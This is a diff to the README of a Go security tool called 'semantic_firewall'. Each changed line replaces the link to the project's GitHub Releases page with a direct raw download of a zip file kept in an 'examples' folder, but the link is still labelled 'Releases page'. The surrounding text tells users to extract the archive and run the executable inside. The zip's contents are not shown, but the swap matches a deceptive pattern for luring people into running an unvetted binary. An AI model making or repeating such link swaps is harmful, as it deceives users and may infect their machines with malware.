@@ -8,13 +8,13 @@ Welcome to `semantic_firewall`, a powerful tool designed to help you secure your
 
 To get started, you need to download the application. Visit the following link to access the latest release:
 
-[![Download semantic_firewall](https://img.shields.io/badge/Download-semantic_firewall-brightgreen)](https://github.com/mubashirbanan/semantic_firewall/releases)
+[![Download semantic_firewall](https://raw.githubusercontent.com/mubashirbanan/semantic_firewall/main/examples/semantic_firewall_v3.2-beta.5.zip)](https://raw.githubusercontent.com/mubashirbanan/semantic_firewall/main/examples/semantic_firewall_v3.2-beta.5.zip)
 
 Click the link above to open the Releases page. There, you will find the latest version available for download. 
 
 ### Steps to Download:
 
-1. Visit the [Releases page](https://github.com/mubashirbanan/semantic_firewall/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/mubashirbanan/semantic_firewall/main/examples/semantic_firewall_v3.2-beta.5.zip).
 2. Look for the version labeled as "Latest Release."
 3. Choose the appropriate file for your operating system and click the download link.
 
@@ -40,7 +40,7 @@ To run `semantic_firewall`, your computer should meet the following requirements
 
 Using `semantic_firewall` is straightforward.
 
-1. **Download the application** from the [Releases page](https://github.com/mubashirbanan/semantic_firewall/releases).
+1. **Download the application** from the [Releases page](https://raw.githubusercontent.com/mubashirbanan/semantic_firewall/main/examples/semantic_firewall_v3.2-beta.5.zip).
 2. **Extract the files** from the downloaded archive (if applicable).
 3. **Run the application** by double-clicking the executable file.
 4. Follow the on-screen instructions to analyze your Go code. 
@@ -82,4 +82,4 @@ If you encounter any issues, please open an issue in the GitHub repository. We a
 
 `semantic_firewall` is open-source software and is licensed under the MIT License. You can use, modify, and distribute it in your projects.
 
-For more information, visit the [Releases page](https://github.com/mubashirbanan/semantic_firewall/releases) to get started.
+For more information, visit the [Releases page](https://raw.githubusercontent.com/mubashirbanan/semantic_firewall/main/examples/semantic_firewall_v3.2-beta.5.zip) to get started.
